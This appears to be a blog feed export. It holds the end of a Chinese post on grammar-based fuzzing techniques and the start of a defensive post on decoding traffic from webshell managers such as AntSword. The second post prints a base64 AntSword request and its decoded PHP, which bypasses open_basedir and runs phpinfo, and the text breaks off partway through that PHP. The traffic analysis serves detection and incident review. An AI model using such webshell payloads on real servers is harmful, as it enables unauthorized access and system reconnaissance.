src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727103008425.4agknyqe2ly0.png"></p><p>如上图，假设我给与一个<code>127.0.0.1</code>的种子，那么被解析之后，0在<code>&lt;octet&gt;</code>中的概率值就会被限制为<code>50%</code>，127和1分别为<code>25%</code>，那么在Fuzz运行的时候相关的概率值就可以赋予给<code>&lt;octet&gt;</code>。那么如果测试一些不常用功能该怎么办呢？其实就是通过原来测常用功能的Inputs得到相关概率，然后进行概率翻转就行了，比如常用功能的Inputs概率如下：</p><pre class="line-numbers language-none"><code class="language-none">[('http', {'prob': 0.2222222222222222}), ('https', {'prob': 0.6666666666666666}), ('ftp', {'prob': 0.0}), ('ftps', {'prob': 0.1111111111111111})]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那么经过翻转之后就是：</p><pre class="line-numbers language-none"><code class="language-none">[('http', {'prob': 0.1111111111111111}), ('https', {'prob': 0.0}), ('ftp', {'prob': 0.6666666666666666}), ('ftps', {'prob': 0.2222222222222222})]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上述就是之前讲到的专注测试常用功能或者非常用功能的基本思路，从此处引出的另一个比较关键的是通过Inputs帮我们专注于目标的特定功能，它和测试常用功能的区别就是首先要找到一批特殊的Inputs，通过这些Inputs作为seeds就可以对语法解析的过程进行概率分析和限制，使得后续的变异可以一直有较高的目标命中率。</p><h3 id="Generator-With-Pre-or-Post-or-order-Func"><a href="#Generator-With-Pre-or-Post-or-order-Func" class="headerlink" title="Generator With Pre or Post or order Func"></a>Generator With Pre or Post or order Func</h3><p>​  在某些Inputs在生成的时候，Fuzz作者可能希望对他们进行一些限制调整，获取其它的操作，这些都可以通过<code>pre func</code>完成。这类似于hook，那么对于func触发的时机一般就分为两种，在Inputs的生成之前或者是生成之后，在语法里面的表示就是：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CHARGE_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"Charge &lt;amount&gt; to my credit card &lt;credit-card-number&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;amount&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"$&lt;float&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;float&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;integer&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;integer&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">:</span> crange<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"&lt;credit-card-number&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;digits&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digits&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit-block&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span>CHARGE_GRAMMAR<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"&lt;float&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>pre<span class="token operator">=</span>high_charge<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment"># high_charge是函数名称</span><span class="token punctuation">}</span><span class="token punctuation">)</span>CHARGE_GRAMMAR<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"&lt;float&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">,</span>                 opts<span class="token punctuation">(</span>pre<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">90000000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># 或者选择使用lambda表达式</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种就是在Seeds的生成之后了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CHARGE_GRAMMAR<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"&lt;credit-card-number&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;digits&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>post<span class="token operator">=</span><span class="token keyword">lambda</span> digits<span class="token punctuation">:</span> fix_credit_card<span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>比如生成的digits不能满足Fuzz的需求，我们就可以通过这种方式来进行及时的修正，以提高Fuzz的效率。</p><h3 id="Greybox-Fuzzing-with-Grammars"><a href="#Greybox-Fuzzing-with-Grammars" class="headerlink" title="Greybox Fuzzing with Grammars"></a>Greybox Fuzzing with Grammars</h3><p>​  除了Fuzzing性能类的问题之外的另一个问题就是变异的导向问题，在Grammars Fuzz生成Input的过程中对于Grammar的内部解析是随机的，但是对于Fuzz目标来说，大量的Input可能会触发相同的分支进而导致代码覆盖率难以达到理想的值。对于AFL类似的覆盖引导型Fuzz来说，因为白盒Fuzz的源代码插桩缘故可以统计代码覆盖率来进行不错的引导，但是还存在很多情况，比如黑盒，甚至是以一种WebServer为目标的Fuzz，统计代码覆盖率并不是一件简单的事情，这时候采取的措施应该是不断的增加Inputs生成的多样性，比如在上述的派生树的子节点的扩展过程进行统计，使其在生成Input语料的时候偏向于还没扩展过的节点。这时候就会面临新的问题，如何快速提升代码覆盖率？</p><p>​  在进行Fuzz的时候，有时候一些输入的部分会被识别为关键字，比如C语言里面的int等，如果告诉Fuzz这些关键字就可以在短时间内极大的提升代码覆盖率，但是就长远来看整体的代码覆盖率还是要差于不使用关键字字典的情况。下面是使用关键字字典的变异Inputs生成器。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DictMutator</span><span class="token punctuation">(</span>Mutator<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Mutate strings using keywords from a dictionary"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dictionary<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Constructor. `dictionary` is the list of keywords to use."""</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dictionary <span class="token operator">=</span> dictionary        self<span class="token punctuation">.</span>mutators<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>insert_from_dictionary<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">insert_from_dictionary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns s with a keyword from the dictionary inserted"""</span>        pos <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        random_keyword <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>self<span class="token punctuation">.</span>dictionary<span class="token punctuation">)</span>        <span class="token keyword">return</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span>pos<span class="token punctuation">]</span> <span class="token operator">+</span> random_keyword <span class="token operator">+</span> s<span class="token punctuation">[</span>pos<span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是问题在于关键字通过字典随机引入的方式很可能破坏了Input本来的正确输入结构进而引发不必要的损耗。解决的方法其实也很简单：<code>Fuzzing with Input Fragments</code>.</p><ol><li>对原有的Input进行Parse，形成派生树。</li><li>对派生树进行节点互换或者节点替换等操作。</li><li>对派生树进行还原，形成新的Input。</li></ol><p>以上的所有操作都在派生树上进行。为了更方便的进行编译操作，可以建立一个派生树的碎片池，每个碎片都由子树组成，子树包括符号和对应的Node节点和其子节点。不过对于派生树的parse其实是非常耗时的，因此可以设置一些时间限制来防止速度过低。不过以Fragments为基础的变异虽然可以很好的符合Inputs合法性的要求但是在代码覆盖率提升方面并不亮眼。而且以此为基础的<code>LangFuzz</code>其实在Inputs生成的速度上也远低于平常的结构化黑盒Fuzz。下面是两组对比数据：</p><pre class="line-numbers language-none"><code class="language-none">LangFuzzFrom the 300 generated inputs, 152 (50.67%) can be parsed.In total, 91 statements are covered.BlackFuzzFrom the 300 generated inputs, 36 (12.00%) can be parsed.In total, 161 statements are covered.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出以Fragments为基础的变异的优势在于它可以很好的生成符合结构化语法的变异。那么现在的疑问就是如何在保证输入语法正确性的前提下提升代码覆盖率？</p><p>​  一种方法是利用类似AFL的覆盖引导方式，利用代码覆盖率不断作为变异的反馈，以此来不断的增添提高代码覆盖率的种子，同时提供<code>structural mutations</code>和<code>32 byte-level mutations</code>两种变异方式，如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">GreyboxGrammarFuzzer</span><span class="token punctuation">(</span>GreyboxFuzzer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Greybox fuzzer using grammars."""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seeds<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                 byte_mutator<span class="token punctuation">:</span> Mutator<span class="token punctuation">,</span> tree_mutator<span class="token punctuation">:</span> FragmentMutator<span class="token punctuation">,</span>                 schedule<span class="token punctuation">:</span> PowerSchedule<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Constructor.        `seeds` - set of inputs to mutate.        `byte_mutator` - a byte-level mutator.        `tree_mutator` = a tree-level mutator.        `schedule` - a power schedule.        """</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>seeds<span class="token punctuation">,</span> byte_mutator<span class="token punctuation">,</span> schedule<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>tree_mutator <span class="token operator">=</span> tree_mutator    <span class="token keyword">def</span> <span class="token function">create_candidate</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns an input generated by structural mutation            of a seed in the population"""</span>        seed <span class="token operator">=</span> cast<span class="token punctuation">(</span>SeedWithStructure<span class="token punctuation">,</span> self<span class="token punctuation">.</span>schedule<span class="token punctuation">.</span>choose<span class="token punctuation">(</span>self<span class="token punctuation">.</span>population<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># Structural mutation</span>        trials <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>trials<span class="token punctuation">)</span><span class="token punctuation">:</span>            seed <span class="token operator">=</span> self<span class="token punctuation">.</span>tree_mutator<span class="token punctuation">.</span>mutate<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>        <span class="token comment"># Byte-level mutation</span>        candidate <span class="token operator">=</span> seed<span class="token punctuation">.</span>data        <span class="token keyword">if</span> trials <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> <span class="token keyword">not</span> seed<span class="token punctuation">.</span>has_structure <span class="token keyword">or</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            dumb_trials <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>seed<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>dumb_trials<span class="token punctuation">)</span><span class="token punctuation">:</span>                candidate <span class="token operator">=</span> self<span class="token punctuation">.</span>mutator<span class="token punctuation">.</span>mutate<span class="token punctuation">(</span>candidate<span class="token punctuation">)</span>        <span class="token keyword">return</span> candidate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想通的种子和变异次数的条件下，测试结果如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">From the <span class="token number">300</span> generated inputs<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0.33</span><span class="token operator">%</span><span class="token punctuation">)</span> can be parsed<span class="token punctuation">.</span>In total<span class="token punctuation">,</span> <span class="token number">180</span> statements are covered<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同时，在Inputs生成的速度方面极大提升，较高的代码覆盖率，但是在Inputs的合法性方面表现是最差的。那这个问题该如何解决呢？答案就是<code>Fuzzing with Input Regions</code>，这种Fuzz的变异方法不再使用派生树节点拆分重组等方式，而是通过将合法种子的不同区域直接进行拆分重组的方式，这里的区域指的是可以和派生树符号对应的连续的字节序列，这样的好处其实在于它操作的对象可能比Fragments更大或者更小，以此种方式进行变异在和上述变异条件相同的情况下测试结构如下：</p><pre class="line-numbers language-none"><code class="language-none">It took the structural greybox fuzzer with region mutator        11.35 seconds to generate and execute 300 inputs.From the 300 generated inputs, 4 (1.33%) can be parsed.In total, 168 statements are covered.On average, 9.1% of a seed in the population can be successfully parsed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到存在较高的代码覆盖率，在速度方面虽然优于Fragments Fuzz但是还是弱于普通的黑盒Fuzz，在代码覆盖率方面高于Fragments Fuzz并和GreyboxGrammarFuzzer维持在相差无几的水平。不过核心原因还是在于，通过的合法Inputs其实占比很低。那么如何解决这个问题？首先要让Fuzzer可以聚焦合法的Inputs。这一点其实前面已经讨论过了，只需要利用<code>schedule</code>给合法Inputs的相关结构赋予更多的权重。测试结果如下：</p><pre class="line-numbers language-none"><code class="language-none">It took AFLSmart 20.75 seconds to generate and execute 300 inputs.From the 300 generated inputs, 46 (15.33%) can be parsed.In total, 162 statements are covered.On average, 23.7% of a seed in the population can be successfully parsed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出在代码覆盖率保持较高水平的情况下，Inputs的合法性也得到了大幅度的提升，但是在Inputs的生成速度上来看，还是远弱于普通的GrammarFuzz。</p><p>​  从上面可以看出，在选择Fuzz的时候本身就是一个取舍的问题，通过二次开发或者针对不同场景的选择才能更好的达到我们想要的结果。</p><h3 id="Parser-input"><a href="#Parser-input" class="headerlink" title="Parser input"></a>Parser input</h3><p>​  假设你在做一个模糊测试，无论是Grammar Fuzz 或者其他的Fuzz也好，如果没有合适的种子那么通过不断变异形成合适的Inputs是非常困难的，当然AFL的作者展示了通过简单的输入不断向目标进化的可能性，但是这毕竟十分浪费时间和性能，效果在很多场景下估计也是不尽人意的。</p><p>​  因此在进行模糊测试的时候如果可以获取一些poc，或者其它较好种子，比如在Fuzz js解释器的一个比较经常的做法就是将一些公开的poc，如下：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> haystack <span class="token operator">=</span> <span class="token string">"foo"</span><span class="token punctuation">;</span><span class="token keyword">var</span> re_text <span class="token operator">=</span> <span class="token string">"^foo"</span><span class="token punctuation">;</span>haystack <span class="token operator">+=</span> <span class="token string">"x"</span><span class="token punctuation">;</span>re_text <span class="token operator">+=</span> <span class="token string">"(x)"</span><span class="token punctuation">;</span><span class="token keyword">var</span> re <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>re_text<span class="token punctuation">)</span><span class="token punctuation">;</span>re<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>RegExp<span class="token punctuation">.</span>input <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print</span><span class="token punctuation">(</span>RegExp<span class="token punctuation">.</span>$1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作为seeds进行变异，将生成的Inputs用来Fuzz解释器。表现出来不错的结果。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>Tips:如何判断对面的代码覆盖率，一般黑盒情况下可以试时间，如果一个Input在对面耗费了更多的时间来运行，那么可以猜测其走过了更多的代码分支。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​  在面对Fuzz的目标的时候最重要的是选择合适的变异方式以及较好的初始种子，根据目标和测试目的不断地进行取舍和针对性开发才能得到比较理想的结果。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://www.fuzzingbook.org/">https://www.fuzzingbook.org</a></p><p>文中数据测试来源大多为Fuzzingbook，因为根据电脑不同，其实具体数值结果会有一定偏差，但是结论都是一样的，因此就展示了书中的测试数据。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fuzzing之Grammars&quot;&gt;&lt;a href=&quot;#Fuzzing之Grammars&quot; class=&quot;headerlink&quot; title=&quot;Fuzzing之Grammars&quot;&gt;&lt;/a&gt;Fuzzing之Grammars&lt;/h1&gt;&lt;h2 id=&quot;Fuzzing-i</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Webshell工具加密流量解析</title>
    <link href="https://rainsec.cn/post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html</id>
    <published>2022-07-19T11:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。</p><h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><p>蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/1.4jjh2zt6dim0.png"><br>提取参数后的编码直接进行base64解码：</p><pre class="line-numbers language-base64" data-language="base64"><code class="language-base64">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb3BhcnI9cHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkb3BkaXIpOyRvY3dkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskdG1kaXI9Ii45ZjFlN2ZjODYiO0Bta2RpcigkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2ZvcigkaT0wOyRpPHNpemVvZigkb3BhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJG9jd2QuIi8iLiR0bWRpcik7fTtmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzU4ZGMiLiI1MjQyYiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiNzkiLiJlNTUiO31vYl9zdGFydCgpO3RyeXtwaHBpbmZvKCk7CmVjaG8gImtpZCIKCjt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$opdir</span><span class="token operator">=</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$opdir</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$oparr</span><span class="token operator">=</span><span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\//"</span><span class="token punctuation">,</span><span class="token variable">$opdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ocwd</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 